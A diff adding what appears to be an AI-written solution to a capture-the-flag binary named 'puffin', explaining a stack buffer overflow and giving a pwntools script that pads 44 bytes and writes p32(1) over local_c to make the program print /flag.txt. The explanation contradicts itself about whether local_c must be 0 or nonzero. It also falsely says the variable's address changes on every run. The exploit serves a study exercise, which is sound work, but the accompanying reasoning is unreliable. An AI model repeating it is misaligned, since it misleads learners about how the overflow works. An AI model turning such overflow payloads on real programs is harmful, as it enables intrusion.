@@ -1,0 +1,31 @@
+- The code is correct!
+
+
+The C code provided is a simple program that reads a string from the user and checks if a certain condition is met. If the condition is not met, it prints a message from a global variable and if the condition is met, it executes a system command to print the contents of a file named "/flag.txt".
+
+The condition is that the variable `local_c` should be equal to 0. However, `local_c` is never modified in the code, so it will always be 0. Therefore, the program will always print the message from the global variable and never execute the system command to print the flag.
+
+To solve this challenge, you need to find a way to modify the value of `local_c` to something other than 0. Since `local_c` is a local variable, it is stored on the stack. You can use a buffer overflow attack to overwrite the value of `local_c`.
+
+Here is a Python script that uses the `pwntools` library to interact with the `puffin` executable and overwrite the value of `local_c`:
+
+```python
+from pwn import *
+
+# Start the process
+p = process('./puffin')
+
+# Craft the payload
+payload = b'A' * 44  # Fill the buffer
+payload += p32(1)    # Overwrite local_c with 1
+
+# Send the payload
+p.sendline(payload)
+
+# Interact with the process to keep it running
+p.interactive()
+```
+
+This script sends a payload that is 44 bytes long (the size of `local_38`) followed by the 4-byte value 1 (in little-endian format). This will overwrite the value of `local_c` with 1, which will cause the program to print the contents of `/flag.txt`.
+
+Please note that the actual address of `local_c` will depend on the specific layout of the stack and the compiler used to compile the binary. You may need to adjust the payload accordingly. Also, the address of `local_c` will be different in each run of the program, so you may need to use a debugger to find the exact address.
